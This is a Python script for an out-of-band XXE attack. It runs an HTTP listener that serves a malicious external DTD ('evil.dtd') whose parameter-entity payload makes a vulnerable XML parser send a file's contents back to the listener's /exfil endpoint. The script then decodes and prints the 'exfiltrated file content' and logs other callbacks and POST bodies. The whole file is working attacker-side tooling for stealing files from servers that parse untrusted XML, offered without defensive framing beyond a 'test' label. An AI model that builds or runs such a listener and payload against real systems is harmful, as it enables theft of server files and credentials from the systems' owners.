#!/usr/bin/env python3
"""
Simple HTTP listener to capture OOB XXE requests
"""
from http.server import BaseHTTPRequestHandler, HTTPServer
import sys
from datetime import datetime

class XXEHandler(BaseHTTPRequestHandler):
    
    # Store the evil DTD content
    evil_dtd = None
    
    def log_message(self, format, *args):
        timestamp = datetime.now().strftime("%H:%M:%S")
        print(f"[{timestamp}] {format % args}")
    
    def do_GET(self):
        if self.path == "/evil.dtd":
            # Serve the evil DTD for parameter entity trick
            print(f"\n[*] Serving evil.dtd to {self.client_address[0]}")
            self.send_response(200)
            self.send_header('Content-type', 'application/xml-dtd')
            self.end_headers()
            
            # DTD that exfiltrates the file content via HTTP parameter
            dtd_content = """<!ENTITY % payload "<!ENTITY send SYSTEM 'http://127.0.0.1:8888/exfil?data=%file;'>">
%payload;"""
            self.wfile.write(dtd_content.encode())
            return
        
        print("\n" + "="*60)
        if "exfil" in self.path and "data=" in self.path:
            print("[!!!] DATA EXFILTRATION RECEIVED!")
            print("="*60)
            print(f"Time: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
            
            # Extract the exfiltrated data from URL parameter
            try:
                from urllib.parse import urlparse, parse_qs, unquote
                parsed = urlparse(self.path)
                params = parse_qs(parsed.query)
                if 'data' in params:
                    exfil_data = unquote(params['data'][0])
                    print(f"\n[!!!] EXFILTRATED FILE CONTENT:")
                    print("-" * 60)
                    print(exfil_data)
                    print("-" * 60)
            except Exception as e:
                print(f"Error parsing data: {e}")
                print(f"Raw path: {self.path}")
        else:
            print("[!!!] XXE REQUEST RECEIVED!")
            print("="*60)
            print(f"Time: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
            print(f"Path: {self.path}")
        
        print(f"Client: {self.client_address[0]}:{self.client_address[1]}")
        print(f"User-Agent: {self.headers.get('User-Agent', 'N/A')}")
        print("="*60 + "\n")
        
        # Send response
        self.send_response(200)
        self.send_header('Content-type', 'text/plain')
        self.end_headers()
        self.wfile.write(b"OK")
    
    def do_POST(self):
        content_length = int(self.headers.get('Content-Length', 0))
        body = self.rfile.read(content_length)
        
        print("\n" + "="*60)
        print("[!!!] XXE POST REQUEST RECEIVED!")
        print("="*60)
        print(f"Time: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
        print(f"Path: {self.path}")
        print(f"Body: {body.decode('utf-8', errors='replace')}")
        print("="*60 + "\n")
        
        self.send_response(200)
        self.send_header('Content-type', 'text/plain')
        self.end_headers()
        self.wfile.write(b"XXE Test Response")

if __name__ == "__main__":
    port = 8888
    if len(sys.argv) > 1:
        port = int(sys.argv[1])
    
    server = HTTPServer(('0.0.0.0', port), XXEHandler)
    print(f"[*] HTTP XXE Listener started on port {port}")
    print(f"[*] Waiting for XXE callbacks...")
    print(f"[*] Press Ctrl+C to stop\n")
    
    try:
        server.serve_forever()
    except KeyboardInterrupt:
        print("\n[*] Shutting down listener...")
        server.shutdown()
